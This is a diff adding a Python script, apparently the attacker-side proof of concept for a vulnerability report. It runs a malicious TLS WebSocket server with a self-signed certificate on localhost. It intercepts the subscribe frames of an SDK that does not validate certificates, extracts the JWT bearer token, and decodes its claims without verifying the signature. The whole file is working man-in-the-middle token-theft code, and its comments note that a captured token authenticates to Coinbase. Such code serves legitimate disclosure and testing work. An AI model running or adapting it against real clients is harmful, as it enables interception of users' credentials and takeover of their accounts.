@@ -1,0 +1,53 @@
+"""Attacker side: a TLS WebSocket server presenting a self-signed cert that no
+CA trusts. A correctly-configured client (ssl.create_default_context()) would
+abort the handshake. The vulnerable SDK connects anyway. We then capture the
+subscribe frame and decode the JWT bearer the client leaks to us.
+"""
+
+import asyncio
+import json
+import ssl
+
+import jwt as pyjwt
+import websockets
+
+
+def _extract_and_decode_jwt(raw):
+    try:
+        data = json.loads(raw)
+    except Exception:
+        return
+    token = data.get("jwt")
+    if not token:
+        return
+    print("\n[attacker] ==== CAPTURED AUTHENTICATED JWT (token disclosure) ====")
+    print("[attacker] raw token:", token)
+    header = pyjwt.get_unverified_header(token)
+    # Signature not verified -- we are the attacker; we only need to read it.
+    claims = pyjwt.decode(token, options={"verify_signature": False})
+    print("[attacker] JWT header:", header)
+    print("[attacker] JWT claims:", claims)
+    print("[attacker] -> a real victim's token here authenticates to Coinbase until 'exp'.\n")
+
+
+async def handler(websocket):
+    print("[attacker] client completed TLS handshake against our UNTRUSTED cert")
+    await websocket.send('{"type": "connected", "channel": "status"}')
+    try:
+        async for message in websocket:
+            print("[attacker] received frame from client:", message)
+            _extract_and_decode_jwt(message)
+    except Exception as e:
+        print("[attacker] connection closed:", e)
+
+
+async def main():
+    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    ssl_context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
+    async with websockets.serve(handler, "localhost", 8765, ssl=ssl_context):
+        print("[attacker] malicious WSS server up on wss://localhost:8765 (self-signed)")
+        await asyncio.Future()
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
